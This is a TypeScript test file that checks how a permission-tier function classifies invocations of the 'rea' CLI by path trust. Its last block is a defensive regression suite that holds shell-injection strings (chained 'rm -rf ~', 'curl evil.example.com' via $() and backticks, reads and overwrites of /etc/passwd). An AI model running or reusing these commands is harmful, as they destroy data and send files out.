/**
 * Tests for `reaCommandTier()` — tier classification of `rea <sub>` Bash
 * invocations.
 *
 * Context: the generic Bash default is Write. When rea's own CLI needs to
 * run from a hook at L1 (e.g. `rea hook push-gate` on pre-push, or
 * `rea audit verify`), that default blocks it. The helper recognizes the
 * subcommand and returns the correct tier so the middleware applies the
 * appropriate policy check.
 *
 * Trust model (unchanged from 0.10.x):
 *   - FULL trust: first token is absolute AND either (a) ends with
 *     `/node_modules/.bin/rea`, or (b) starts with `/usr/` or `/opt/` AND
 *     ends with `/bin/rea`. Anything else is untrusted or weak.
 *   - WEAK trust: bare `rea`, `npx rea …`, relative paths. Returns
 *     `Destructive` for `freeze` so `rea freeze` at L1 still blocks;
 *     returns `null` otherwise.
 *   - No trust: returns `null` for any non-rea first token.
 *
 * 0.11.0 surface:
 *   - Added: `hook push-gate` (Read).
 *   - Removed: `cache ...`, `audit record codex-review` — the stateless
 *     push-gate needs neither. Lingering invocations fall through to the
 *     default Write tier.
 */

import { describe, expect, it } from 'vitest';
import { reaCommandTier } from '../../src/config/tier-map.js';
import { Tier } from '../../src/policy/types.js';

describe('reaCommandTier — fully-trusted invocations (absolute path only)', () => {
  it.each([
    ['/usr/local/bin/rea check', Tier.Read],
    ['/usr/local/bin/rea doctor', Tier.Read],
    ['/usr/local/bin/rea status', Tier.Read],
    ['/usr/bin/rea check', Tier.Read],
    ['/opt/homebrew/bin/rea doctor', Tier.Read],
    ['/usr/local/bin/rea audit verify', Tier.Read],
    ['/usr/local/bin/rea hook push-gate', Tier.Read],
    ['/opt/app/node_modules/.bin/rea hook push-gate --base origin/main', Tier.Read],
  ])('%s → Read', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });

  it.each([
    ['/usr/local/bin/rea audit rotate', Tier.Write],
    ['/usr/local/bin/rea init --yes', Tier.Write],
    ['/usr/local/bin/rea serve', Tier.Write],
    ['/usr/local/bin/rea upgrade --yes', Tier.Write],
    ['/usr/local/bin/rea unfreeze --yes', Tier.Write],
    ['/usr/local/bin/rea something-unrecognized', Tier.Write],
    // Removed subcommand — falls through to the default Write tier.
    ['/usr/local/bin/rea cache set abc pass --branch feat/x --base main', Tier.Write],
    ['/usr/local/bin/rea audit record codex-review --head-sha abc --verdict pass', Tier.Write],
  ])('%s → Write', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });

  it.each([
    ['/usr/local/bin/rea freeze --reason halt', Tier.Destructive],
    ['/opt/app/node_modules/.bin/rea freeze --reason halt', Tier.Destructive],
  ])('%s → Destructive', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });

  it('bare /usr/.../rea (no subcommand) treats as Read — equivalent to --help', () => {
    expect(reaCommandTier('/usr/local/bin/rea')).toBe(Tier.Read);
  });

  it('tolerates leading/trailing whitespace', () => {
    expect(reaCommandTier('   /usr/local/bin/rea check   ')).toBe(Tier.Read);
  });
});

describe('reaCommandTier — weak trust (bare `rea`, `npx rea`, relative paths)', () => {
  it.each([
    'rea check',
    'rea doctor',
    'rea status',
    'rea audit verify',
    'rea hook push-gate',
    'rea',
    'npx rea check',
    'npx rea doctor',
    'npx rea hook push-gate',
    'npx @bookedsolid/rea doctor',
    './node_modules/.bin/rea check',
    './node_modules/.bin/rea doctor',
    '/home/user/.npm-global/bin/rea check',
    '/home/user/.local/bin/rea doctor',
  ])('%s → null (defers to generic Bash Write)', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it.each([
    'rea init --yes',
    'rea upgrade --yes',
    'npx rea init --yes',
    './node_modules/.bin/rea upgrade',
  ])('%s → null (write fall-through)', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it.each([
    'rea freeze --reason "stop"',
    'npx rea freeze --reason halt',
    'npx @bookedsolid/rea freeze --reason halt',
    './node_modules/.bin/rea freeze --reason halt',
    '/home/user/.npm-global/bin/rea freeze',
  ])('%s → Destructive (upgrade preserved even under weak trust)', (cmd) => {
    expect(reaCommandTier(cmd)).toBe(Tier.Destructive);
  });
});

describe('reaCommandTier — non-rea commands', () => {
  it.each([
    'ls -la',
    'git push',
    'node scripts/build.js',
    'npm install',
    'npx prettier --check .',
    'pnpm test',
    'rearrange-files',
    'area-test',
  ])('returns null for %s', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it('returns null for empty or whitespace-only input', () => {
    expect(reaCommandTier('')).toBeNull();
    expect(reaCommandTier('   ')).toBeNull();
  });

  it('returns null for npx without rea', () => {
    expect(reaCommandTier('npx prettier')).toBeNull();
    expect(reaCommandTier('npx')).toBeNull();
  });
});

/**
 * Codex HIGH regression — shell-metachar tier bypass. A command like
 * `rea check && rm -rf ~` is rejected outright — the `&&` payload is
 * arbitrary, so Read-tier downgrade for the prefix tells us nothing
 * about what the shell actually executes.
 */
describe('reaCommandTier — shell-metacharacter bypass (Codex HIGH)', () => {
  it.each([
    '/usr/local/bin/rea check && touch /tmp/pwned',
    '/usr/local/bin/rea check || rm -rf ~',
    '/usr/local/bin/rea check ; rm -rf ~',
    '/usr/local/bin/rea hook push-gate | cat',
    '/usr/local/bin/rea check & curl evil.example.com',
    '/usr/local/bin/rea check $(curl evil.example.com)',
    '/usr/local/bin/rea check `curl evil.example.com`',
    '/usr/local/bin/rea check >(tee /tmp/leak)',
    '/usr/local/bin/rea check <(cat /etc/passwd)',
    '/usr/local/bin/rea check\ntouch /tmp/pwned',
    '/usr/local/bin/rea check\rcarriage-return',
    '/usr/local/bin/rea check > /etc/passwd',
    '/usr/local/bin/rea check < /etc/passwd',
    '/usr/local/bin/rea check >> /tmp/out',
    '/usr/local/bin/rea doctor << EOF',
  ])('returns null for "%s"', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it.each([
    'rea check',
    'rea doctor',
    './evil-rea freeze',
    './rea check',
    './bin/rea check',
    '/opt/evil-rea check',
    '/tmp/not-the-real-rea doctor',
    '/tmp/repo/bin/rea doctor',
    '/home/user/repo/bin/rea check',
  ])('returns null for weak/untrusted path-based "rea" invocations: %s', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it.each([
    ['/usr/local/bin/rea doctor', Tier.Read],
    ['/usr/bin/rea check', Tier.Read],
    ['/opt/app/node_modules/.bin/rea hook push-gate', Tier.Read],
  ])('keeps classification for trusted paths: %s', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });
});
